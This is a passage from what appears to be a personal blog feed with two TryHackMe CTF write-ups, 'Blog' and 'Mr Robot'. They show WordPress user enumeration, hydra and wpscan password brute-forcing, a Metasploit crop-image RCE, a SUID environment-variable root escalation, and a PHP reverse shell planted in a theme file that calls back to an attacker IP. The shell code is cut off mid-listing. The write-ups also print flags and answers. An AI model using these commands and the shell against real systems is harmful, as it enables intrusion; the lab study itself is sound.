phpma/index.php         [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 396ms]
phpmyadmin-old/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 407ms]
phpMyAdmin.old/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 407ms]
phpMyAdmin/index.php    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 407ms]
phpMyAdmin/phpMyAdmin/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 404ms]
phpmyadmin/index.php    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 411ms]
phpmyadmin/phpmyadmin/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 446ms]
phpmyadmin1/index.php   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 396ms]
phpmyadmin0/index.php   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 426ms]
phpmyadmin2/index.php   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 408ms]
phpMyadmin_bak/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 400ms]
phpMyAdminold/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 416ms]
pma-old/index.php       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 403ms]
PMA/index.php           [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 443ms]
pma/index.php           [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 441ms]
PMA2/index.php          [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 405ms]
pmd/index.php           [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 387ms]
pmamy/index.php         [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 434ms]
pmamy2/index.php        [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 432ms]
public..                [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 469ms]
readme.html             [Status: 200, Size: 7415, Words: 760, Lines: 99, Duration: 36ms]
robots.txt              [Status: 200, Size: 67, Words: 4, Lines: 4, Duration: 425ms]
roundcube/index.php     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 405ms]
server-status/          [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 16ms]
siteadmin/index.php     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 440ms]
sql/index.php           [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 462ms]
static..                [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 221ms]
templates/beez/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 379ms]
templates/ja-helio-farsi/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 393ms]
templates/rhuk_milkyway/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 397ms]
tmp/index.php           [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 408ms]
tools/phpMyAdmin/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 408ms]
typo3/phpmyadmin/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 412ms]
web/phpMyAdmin/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 389ms]
webadmin/index.php      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 398ms]
wp-content/             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 13ms]
wp-config.php           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 366ms]
wp-content/upgrade/     [Status: 200, Size: 772, Words: 52, Lines: 16, Duration: 17ms]
wp-content/uploads/     [Status: 200, Size: 1152, Words: 76, Lines: 18, Duration: 26ms]
wp-includes/rss-functions.php [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 16ms]
wp-content/plugins/adminer/inc/editor/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 451ms]
wp-login.php            [Status: 200, Size: 3087, Words: 157, Lines: 70, Duration: 411ms]
wp-includes/            [Status: 200, Size: 42161, Words: 2443, Lines: 207, Duration: 500ms]
wp-register.php         [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 476ms]
wp-json/                [Status: 200, Size: 73052, Words: 3515, Lines: 1, Duration: 619ms]
wp-json/wp/v2/users/    [Status: 200, Size: 1096, Words: 3, Lines: 1, Duration: 712ms]
www/phpMyAdmin/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 435ms]
xampp/phpmyadmin/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 397ms]
wp-admin/               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2743ms]
wp-admin/setup-config.php [Status: 500, Size: 2936, Words: 260, Lines: 123, Duration: 2827ms]
wp-admin/install.php    [Status: 200, Size: 1074, Words: 62, Lines: 15, Duration: 2922ms]
xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 1194ms]

</span></code></pre></div></div> <p>After that, I try to connect to the admin panel but I have no usernames and admin doesn’t work. I use hydra to test them.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-L</span> top-usernames.txt <span class="nt">-p</span> <span class="nb">test </span>blog.thm http-post-form <span class="s2">"/wp-login/:log=^USER^&amp;pwd=^PASS^:F=Invalid username"</span>
</code></pre></div></div> <p>I have nothing concluant so I’ll check if the Wordpress version has any vulnerabilites. I use metasploit coupled with the <em>wordpress_scanner</em> module.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 auxiliary<span class="o">(</span>scanner/http/wordpress_scanner<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhosts blog.thm
rhosts <span class="o">=&gt;</span> blog.thm
msf6 auxiliary<span class="o">(</span>scanner/http/wordpress_scanner<span class="o">)</span> <span class="o">&gt;</span> exploit

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying 10.10.180.6
<span class="o">[</span>+] 10.10.180.6 - Detected Wordpress 5.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.180.6 - Enumerating Themes
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.180.6 - Progress  0/2 <span class="o">(</span>0.0%<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.180.6 - Finished scanning themes
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.180.6 - Enumerating plugins
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.180.6 - Progress   0/57 <span class="o">(</span>0.0%<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.180.6 - Finished scanning plugins
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.180.6 - Searching Users
<span class="o">[</span>+] 10.10.180.6 - Detected user: Billy Joel with username: bjoel
<span class="o">[</span>+] 10.10.180.6 - Detected user: Karen Wheeler with username: kwheel
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.180.6 - Finished scanning <span class="nb">users</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.180.6 - Finished all scans
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Scanned 1 of 1 hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Auxiliary module execution completed
</code></pre></div></div> <p><strong>What version of the above CMS was being used?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">5.0</code></em></p> <p>Now we have the usernames, we also know the creator of this blog is Billy’s mom. She might be the one who is the admin of the blog. Let’s try bruteforce her account using wpscan. (We could have used it before)</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>──<span class="o">(</span>root㉿kali<span class="o">)</span>-[/usr/share/seclists/Passwords/Leaked-Databases]
└─# wpscan <span class="nt">--url</span> http://blog.thm <span class="nt">-U</span> kwheel <span class="nt">-P</span> rockyou.txt
_______________________________________________________________
         __          _______   _____
         <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____|
          <span class="se">\ \ </span> /<span class="se">\ </span> / /| |__<span class="o">)</span> | <span class="o">(</span>___   ___  __ _ _ __ ®
           <span class="se">\ \/</span>  <span class="se">\/</span> / |  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __|/ _<span class="sb">`</span> | <span class="s1">'_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://blog.thm/ [10.10.180.6]
[+] Started: Tue Oct 10 20:27:01 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://blog.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blog.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.thm/feed/, &lt;generator&gt;https://wordpress.org/?v=5.0&lt;/generator&gt;
 |  - http://blog.thm/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.0&lt;/generator&gt;

[+] WordPress theme in use: twentytwenty
 | Location: http://blog.thm/wp-content/themes/twentytwenty/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.2
 | Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: '</span>Version: 1.3<span class="s1">'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:14 &lt;=====================================&gt; (137 / 137) 100.00% Time: 00:00:14

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - kwheel / cutiepie1                                                                                      
Trying kwheel / dallas1 Time: 00:03:20 &lt;                                   &gt; (2865 / 14347256)  0.01%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: kwheel, Password: cutiepie1

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Oct 10 20:30:45 2023
[+] Requests Done: 3053
[+] Cached Requests: 7
[+] Data Sent: 1.469 MB
[+] Data Received: 22.193 MB
[+] Memory used: 272.641 MB
[+] Elapsed time: 00:03:44
</span></code></pre></div></div> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-l</span> kwheel <span class="nt">-P</span> rockyou.txt blog.thm http-post-form <span class="s2">"/wp-login/:log=^USER^&amp;pwd=^PASS^:F=The password you entered for the username kwheel is incorrect."</span>
</code></pre></div></div> <p>From now, we have an access to the admin panel but we can’t really do anything for now because kwheel is in reality an author account.</p> <p><img src="/assets/img/images/thm_ctf_blog/r1Upu4X-p.png" alt="Dashboard"/></p> <p>To bypass these resctrictions, we have to use the RCE crop-image found on https://www.exploit-db.com/exploits/49512. In msfconsole, we can find a similar version.</p> <pre><code class="language-metasploit">msf6 exploit(multi/http/wp_crop_rce) &gt; options

Module options (exploit/multi/http/wp_crop_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   cutiepie1        yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     blog.thm         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wi
                                         ki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME   kwheel           yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host
</code></pre> <p>Now we have access to the blog’s server, we can try to retrieve the user.txt flag.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> download /home/bjoel/user.txt
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Downloading: /home/bjoel/user.txt -&gt; /root/user.txt
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Downloaded 57.00 B of 57.00 B <span class="o">(</span>100.0%<span class="o">)</span>: /home/bjoel/user.txt -&gt; /root/user.txt
<span class="o">[</span><span class="k">*</span><span class="o">]</span> download   : /home/bjoel/user.txt -&gt; /root/user.txt

┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[~]
└─# <span class="nb">cat </span>user.txt 
You won<span class="s1">'t find what you'</span>re looking <span class="k">for </span>here.

TRY HARDER
</code></pre></div></div> <p>Unfortunately, we don’t get the excepted results. We need to dive deeper. We may get useful informations in the pdf located in bjoel home folder.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Bill Joel,
This letter is to inform you that your employment with Rubber Ducky Inc. will end effective immediately
on 5/20/2020.
You have been terminated <span class="k">for </span>the following reasons:
• Repeated offenses regarding company removable media policy
• Repeated offenses regarding company Acceptable Use Policy
• Repeated offenses regarding tardiness
</code></pre></div></div> <p>We use linpeas to enumerate or to try getting some interesting stuff. After not getting anything useful, we tried to enumerate any SUID binary in almost every directory available. The most suspicious one <em>/usr/bin/checker</em>. We check it’s behaviour by running it.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/sbin/checker
Not an Admin

</code></pre></div></div> <p>After running ltrace to get more infos.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ltrace /usr/sbin/checker
getenv<span class="o">(</span><span class="s2">"admin"</span><span class="o">)</span>                                  <span class="o">=</span> nil
puts<span class="o">(</span><span class="s2">"Not an Admin"</span><span class="o">)</span>                             <span class="o">=</span> 13
Not an Admin
+++ exited <span class="o">(</span>status 0<span class="o">)</span> +++
</code></pre></div></div> <p>It looks that it checks if there is any environement variable with the name <em>“admin”</em>. With this knowledge acquired, we have to export a env var with the account <em>www-data</em>.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">admin</span><span class="o">=</span><span class="s2">"nil"</span><span class="p">;</span>
/usr/sbin/checker
<span class="nb">whoami
</span>root
</code></pre></div></div> <p>Now that we are root, we must retrieve the root.txt and user.txt flags.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /root/root.txt
9a0b2b618bef9bfa7ac28c1353d9f318
find / <span class="nt">-name</span> <span class="s2">"user.txt"</span>
/home/bjoel/user.txt
/media/usb/user.txt
<span class="nb">cat</span> /media/usb/user.txt
c8421899aae571f7af486492b71a8ab7
</code></pre></div></div> <p><strong>root.txt</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">9a0b2b618bef9bfa7ac28c1353d9f318</code></em></p> <p><strong>user.txt</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">c8421899aae571f7af486492b71a8ab7</code></em></p> <p><strong>Where was user.txt found?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">/media/usb/</code></em></p> <p><strong>What CMS was Billy using?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Wordpress</code></em></p>]]></content><author><name></name></author><category term="THM"/><category term="CTF"/><category term="Privilege Escalation"/><category term="Wordpress"/><summary type="html"><![CDATA[THM CTF Blog]]></summary></entry><entry><title type="html">THM Mr Robot CTF</title><link href="https://nonohm.github.io/blog/2023/THM-Mr-Robot-CTF/" rel="alternate" type="text/html" title="THM Mr Robot CTF"/><published>2023-09-16T15:42:39+00:00</published><updated>2023-09-16T15:42:39+00:00</updated><id>https://nonohm.github.io/blog/2023/THM-Mr-Robot-CTF</id><content type="html" xml:base="https://nonohm.github.io/blog/2023/THM-Mr-Robot-CTF/"><![CDATA[<h1 id="thm-mr-robot-ctf">THM Mr Robot CTF</h1> <h2 id="task-1---connect-to-our-network">Task 1 - Connect to our Network</h2> <p>To begin with, just connect to the network using the OpenVPN file provided in the access room.</p> <h2 id="task-2---hack-the-machine">Task 2 - Hack the machine</h2> <p>Firstly, I need to know more about the machine we want to access. To do that, we’ll be making a nmap scan to know if ports are opened.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sV</span> <span class="nt">-O</span> 10.10.25.198
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-09-16 09:59 EDT
Nmap scan report <span class="k">for </span>10.10.25.198
Host is up <span class="o">(</span>0.029s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd
Device <span class="nb">type</span>: general purpose|specialized|storage-misc|broadband router|WAP|printer
Running <span class="o">(</span>JUST GUESSING<span class="o">)</span>: Linux 5.X|3.X|4.X|2.6.X <span class="o">(</span>89%<span class="o">)</span>, Crestron 2-Series <span class="o">(</span>87%<span class="o">)</span>, HP embedded <span class="o">(</span>87%<span class="o">)</span>, Asus embedded <span class="o">(</span>86%<span class="o">)</span>
OS CPE: cpe:/o:linux:linux_kernel:5.4 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6 cpe:/h:asus:rt-n56u cpe:/o:linux:linux_kernel:3.4
Aggressive OS guesses: Linux 5.4 <span class="o">(</span>89%<span class="o">)</span>, Linux 3.10 - 3.13 <span class="o">(</span>88%<span class="o">)</span>, Linux 3.10 - 4.11 <span class="o">(</span>88%<span class="o">)</span>, Linux 3.12 <span class="o">(</span>88%<span class="o">)</span>, Linux 3.13 <span class="o">(</span>88%<span class="o">)</span>, Linux 3.13 or 4.2 <span class="o">(</span>88%<span class="o">)</span>, Linux 3.2 - 3.5 <span class="o">(</span>88%<span class="o">)</span>, Linux 3.2 - 3.8 <span class="o">(</span>88%<span class="o">)</span>, Linux 4.2 <span class="o">(</span>88%<span class="o">)</span>, Linux 4.4 <span class="o">(</span>88%<span class="o">)</span>
No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>38.15 seconds
</code></pre></div></div> <p>It shows that the ports 22 (ssh), 80 (http) and 443 (https) are currently running. We’ll verify if a vulnerable website is running.</p> <p>When access to the website, we are welcomed with a Mr Robot themed website with some commands to trigger actions.</p> <p><img src="/assets/img/images/thm_mr_robot_ctf_writeup/rydXD4X1T.png" alt="fsociety website"/></p> <p>After some surfing with prepare command or fsociety, we continue using join. We are asked to put my email address, so we use a temporary mail if we receive something important.</p> <p><img src="/assets/img/images/thm_mr_robot_ctf_writeup/SysnE_4kT.png" alt="mail asking"/></p> <p>After some time, nothing has been sent so we continue digging by looking at the html source code.</p> <p><img src="/assets/img/images/thm_mr_robot_ctf_writeup/Syk1_uVyT.png" alt="fsociety website source code"/></p> <p>There’s nothing interesting so we fuzz the website to know if there any hidden webpage using</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-w</span> /usr/share/seclists/Fuzzing.fuzz-Bo0om.txt <span class="nt">-u</span> http://10.10.150.113/FUZZ <span class="nt">-mc</span> 200

┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[/usr/share/seclists/Fuzzing]
└─<span class="nv">$ </span>ffuf <span class="nt">-w</span> fuzz-Bo0oM.txt <span class="nt">-u</span> http://10.10.150.113/FUZZ <span class="nt">-mc</span> 200

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.150.113/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

[Status: 200, Size: 1188, Words: 189, Lines: 31, Duration: 31ms]
    * FUZZ: admin/

[Status: 200, Size: 1188, Words: 189, Lines: 31, Duration: 31ms]
    * FUZZ: admin/index

[Status: 200, Size: 1188, Words: 189, Lines: 31, Duration: 32ms]
    * FUZZ: admin/index.html

[Status: 200, Size: 1188, Words: 189, Lines: 31, Duration: 30ms]
    * FUZZ: index.html

[Status: 200, Size: 309, Words: 25, Lines: 157, Duration: 29ms]
    * FUZZ: license

[Status: 200, Size: 309, Words: 25, Lines: 157, Duration: 29ms]
    * FUZZ: license.txt

[Status: 200, Size: 64, Words: 14, Lines: 2, Duration: 30ms]
    * FUZZ: readme

[Status: 200, Size: 64, Words: 14, Lines: 2, Duration: 29ms]
    * FUZZ: readme.html

[Status: 200, Size: 41, Words: 2, Lines: 4, Duration: 29ms]
    * FUZZ: robots.txt

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 754ms]
    * FUZZ: wp-config.php

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 709ms]
    * FUZZ: wp-content/

[Status: 200, Size: 2613, Words: 115, Lines: 53, Duration: 743ms]
    * FUZZ: wp-login/

[Status: 200, Size: 2613, Words: 115, Lines: 53, Duration: 748ms]
    * FUZZ: wp-login.php

:: Progress: [4842/4842] :: Job [1/1] :: 49 req/sec :: Duration: [0:01:43] :: Errors: 0 ::

</span></code></pre></div></div> <p>We can see there is a robots.txt available so we check it.</p> <pre><code class="language-txt">User-agent: *
fsocity.dic
key-1-of-3.txt
</code></pre> <p>With this clue, we try to go to the URL: After pressing enter, the flag n°1 for this CTF is given:</p> <p><em>Key 1: <code class="language-plaintext highlighter-rouge">073403c8a58a1f80d943455fb30724b9</code></em></p> <p>Then, we try to go to the URL https://10.10.150.113/fsocity.dic. When that is done, the browser downloaded the associated file.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">head </span>fsocity.dic
<span class="nb">true
false
</span>wikia
from
the
now
Wikia
extensions
scss
window

</code></pre></div></div> <p>The file is really long and looks like a password list. With ffuf, we found we can access to a wordpress login (https://10.10.150.113/wp-login.php) so we maybe have to bruteforce to access it.</p> <p><img src="/assets/img/images/thm_mr_robot_ctf_writeup/HJeufYVk6.png" alt="WP Panel login"/></p> <p>With the username Elliot, the error message sent by wp is different (the username admin doesn’t work): i.e, if the username doesn’t exist, it returns <em>“Invalid username”</em> but if it’s exinsting, it returns <em>“The password you entered for the username <strong>USER</strong> is incorrect”</em>.</p> <p><img src="/assets/img/images/thm_mr_robot_ctf_writeup/r1WRHK4Jp.png" alt="Login Incorrect"/></p> <p>Using hydra, we can retrieve the right password associated with the username Elliot.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-l</span> Elliot <span class="nt">-P</span> fsocity.dic  http://10.10.150.113 http-post-form <span class="s2">"/wp-login/:log=^USER^&amp;pwd=^PASS^:F=The password you entered for the username Elliot is incorrect."</span>
</code></pre></div></div> <p>After obtaining the combo <code class="language-plaintext highlighter-rouge">Elliot:ER28-0652</code>, we connect to the wp pannel.</p> <p><img src="/assets/img/images/thm_mr_robot_ctf_writeup/H1YjDtNkT.png" alt="Dashboard"/></p> <p>With the access, we can obtain a reverse shell by modifying the site with the <em>Editor</em> section in <em>Appearance</em>. Then, we modify the archive.php to put the following code:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="c1">// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php</span>
<span class="c1">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span>

<span class="nb">set_time_limit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="nv">$VERSION</span> <span class="o">=</span> <span class="s2">"1.0"</span><span class="p">;</span>
<span class="nv">$ip</span> <span class="o">=</span> <span class="s1">'10.11.24.118'</span><span class="p">;</span>
<span class="nv">$port</span> <span class="o">=</span> <span class="mi">6870</span><span class="p">;</span>
<span class="nv">$chunk_size</span> <span class="o">=</span> <span class="mi">1400</span><span class="p">;</span>
<span class="nv">$write_a</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
<span class="nv">$error_a</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
<span class="nv">$shell</span> <span class="o">=</span> <span class="s1">'uname -a; w; id; sh -i'</span><span class="p">;</span>
<span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="nv">$debug</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">'pcntl_fork'</span><span class="p">))</span> <span class="p">{</span>
	<span class="nv">$pid</span> <span class="o">=</span> <span class="nb">pcntl_fork</span><span class="p">();</span>
	
	<span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
		<span class="nf">printit</span><span class="p">(</span><span class="s2">"ERROR: Can't fork"</span><span class="p">);</span>
		<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	
	<span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>  <span class="c1">// Parent exits</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="nb">posix_setsid</span><span class="p">()</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
		<span class="nf">printit</span><span class="p">(</span><span class="s2">"Error: Can't setsid()"</span><span class="p">);</span>
		<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
	<span class="nf">printit</span><span class="p">(</span><span class="s2">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span><span class="p">);</span>
<span class="p">}</span>

<span class="nb">chdir</span><span class="p">(</span><span class="s2">"/"</span><span class="p">);</span>

<span class="nb">umask</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

<span class="c1">// Open reverse connection</span>
<span class="nv">$sock</span> <span class="o">=</span> <span class="nb">fsockopen</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span>
	<span class="nf">printit</span><span class="p">(</span><span class="s2">"</span><span class="nv">$errstr</span><span class="s2"> (</span><span class="nv">$errno</span><span class="s2">)"</span><span class="p">);</span>
	<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="nv">$descriptorspec</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
